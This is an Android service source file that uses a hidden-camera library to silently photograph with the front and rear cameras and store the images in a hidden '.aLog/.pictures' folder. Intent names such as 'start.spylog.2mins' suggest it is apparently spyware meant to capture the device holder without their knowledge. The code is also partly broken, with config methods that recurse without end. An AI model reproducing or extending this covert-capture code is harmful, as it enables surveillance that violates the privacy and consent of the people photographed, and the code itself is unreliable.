package mdane.myapplication6.Services;

import android.Manifest;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;

public class HandleCameraSnap extends HiddenCameraService {


    static boolean startedSecondActivity;
    Handler S = new Handler();
    Handler a = new Handler();
    File imageFile;
    Thread B;
    Thread mThread;
    Runnable r;
    Runnable m;
    CameraManager aCamera;
    int rCounter = 0;
    int mCounter = 0;
    String CameraId;
    // stopSelf();
    //picgettter();
    Bundle savedInstanceState;
    Timer timer = new Timer();
    CameraDevice cDevice;
    Intent ab = new Intent();
    IntentFilter AB = new IntentFilter("start.spylog.2mins");
    IntentFilter AC = new IntentFilter("start.spylog.turnOff");
    int amtOfPics;
    private boolean isBusy;
    private SensorManager mSensorManager;
    private Sensor mAccelerometer;
    private float mAccel; // acceleration apart from gravity
    private float mAccelCurrent; // current acceleration including gravity
    private float mAccelLast; // last acceleration including gravity

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        CameraConfig cameraConfig = new CameraConfig()
                .getBuilder(getApplicationContext())
                .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                .build();
        startCamera(cameraConfig);
Handler a=new Handler();
        a.postDelayed(new Runnable() {
                          @Override
                          public void run() {
                              if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {

                                  if (HiddenCameraUtils.canOverDrawOtherApps(getApplicationContext())) {
                                     ;
                                      takePicture();
                                  } else {
                                      //Open settings to grant permission for "Draw other apps".
                                      HiddenCameraUtils.openDrawOverPermissionSetting(getApplicationContext());
                                  }
                          }
                      }},2000);

                startedSecondActivity = false;
        Log.i("TimeService", "");
        isBusy = false;
        return START_NOT_STICKY;
    }

public void takepic(){
    CameraConfig cameraConfig = new CameraConfig()
            .getBuilder(getApplicationContext())
            .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
            .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
            .build();
    startCamera(cameraConfig);
takePicture();

    }

    /**
     * show notification when Accel is more then the given int.
     */
    private void showNotification() {
        isBusy = true;


        m = new Runnable() {

            @Override
            public void run() {

                stopCamera();
                CameraConfig cameraConfig = getFrontConfig(aCamera, cDevice);
                startCamera(cameraConfig);

                try {
                    takePicture();
                } catch (RuntimeException e) {
                    a.removeCallbacks(this);

                }
                ;
                Log.i("REAR", "");
                cameraConfig = null;
                ;
                rCounter++;
                if (rCounter <= 1) {

                    a.post(r);
                } else {
                    a.removeCallbacks(this);
                    isBusy = false;
                    rCounter = 0;
                }
            }
        };
        r = new Runnable() {
            @Override
            public void run() {

                stopCamera();
                final CameraConfig cameraConfig1 = getFrontConfig(aCamera, cDevice);
                startCamera(cameraConfig1);
                try {
                    takePicture();
                } catch (RuntimeException e) {
                    a.removeCallbacks(this);
                }
                final Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        mCounter++;
                        if (mCounter <= 1) {

                            a.post(m);
                        } else {
                            a.removeCallbacks(this);
                            isBusy = false;
                            mCounter = 0;
                        }
                    }
                });
                thread.start();//thread.run();
            }
        };
        final Runnable runner = new Runnable() {
            @Override
            public void run() {
                Thread ab = new Thread(new Runnable() {
                    public void run() {
                        a.post(m);
                    }

                    ;
                });
                ab.start();
            }
        };

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {

            if (HiddenCameraUtils.canOverDrawOtherApps(this)) {
                a.post(runner);

            } else {
                //Open settings to grant permission for "Draw other apps".
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
            }
        }
    }

    @Override
    public void onImageCapture(@NonNull final File imageFile) {
       stopCamera();
        B = new Thread(new Runnable() {
            @Override
            public void run() {
                File file = openFileForImage();
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inPreferredConfig = Bitmap.Config.RGB_565;
                Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);

                Log.d("Image capture", imageFile.length() + "");
                if (bitmap != null) {
                    FileOutputStream outStream = null;
                    try {
                        outStream = new FileOutputStream(file);
                        if (!bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outStream)) {
                            Log.i("", "Unable to save image to file.");

                        } else {
                            Log.i("save image to file.", file.getPath());

                        }
                        outStream.close();
stopSelf();
                    } catch (Exception e) {
                    }
                }
            }
        });//end of thread
        B.start();//call the thread;
    }

    public CameraConfig getRearConfig(final CameraManager a, final CameraDevice cDevice) throws RuntimeException {
        try {
            CameraConfig cameraConfig = new CameraConfig()
                    .getBuilder(getApplicationContext())
                    .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                    .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                    .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                    .build();
            startCamera(cameraConfig);
            return cameraConfig;
        } catch (RuntimeException e) {

            a.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                @Override
                public void onCameraUnavailable(@NonNull String cameraId) {
                    super.onCameraUnavailable(cameraId);
                    cDevice.close();
                    a.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                        @Override
                        public void onCameraAvailable(String cameraId) {
                            super.onCameraAvailable(cameraId);
                            getRearConfig(a, cDevice);
                            Log.i("Camera isn't null", "");
                        }
                    }, new android.os.Handler());
                }

                ;
            }, new android.os.Handler());
            ;
        }
        return this.getRearConfig(aCamera, cDevice);
    }

    public CameraConfig getFrontConfig(final CameraManager a, final CameraDevice cDevice) throws RuntimeException {
        try {
            CameraConfig cameraConfig = new CameraConfig()
                    .getBuilder(getApplicationContext())
                    .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                    .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                    .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                    .build();
            startCamera(cameraConfig);
            return cameraConfig;
        } catch (RuntimeException e) {

            a.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                @Override
                public void onCameraUnavailable(@NonNull String cameraId) {
                    super.onCameraUnavailable(cameraId);
                    cDevice.close();
                    a.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                        @Override
                        public void onCameraAvailable(String cameraId) {
                            super.onCameraAvailable(cameraId);
                            getRearConfig(a, cDevice);
                            Log.i("Camera isn't null", "not null");
                        }
                    }, new android.os.Handler());
                }

                ;
            }, new android.os.Handler());
            ;
        }
        return this.getFrontConfig(aCamera, cDevice);
    }

    private File openFileForImage() {
        File imageDirectory = null;
        String storageState = Environment.getExternalStorageState();
        if (storageState.equals(Environment.MEDIA_MOUNTED)) {
            imageDirectory = new File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    ".aLog/.pictures");
            if (!imageDirectory.exists() && !imageDirectory.mkdirs()) {
                imageDirectory = null;
            } else {
                SimpleDateFormat dateFormat = new SimpleDateFormat("mm_dd_yyyy_hh_mm_ss",
                        Locale.getDefault());

                return new File(imageDirectory.getPath() +
                        File.separator + "image_" +
                        dateFormat.format(new Date()) + ".jpeg");
            }
        }
        return null;
    }

    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                //Camera open failed. Probably because another application
                //is using the camera

                Toast.makeText(this, "Cannot open camera.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                //camera permission is not available
                //Ask for the camra permission before initializing it.
                Toast.makeText(this, "Camera permission not available.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                Toast.makeText(this, "Your device does not have front camera.", Toast.LENGTH_LONG).show();
                break;
        }

        ;
    }



}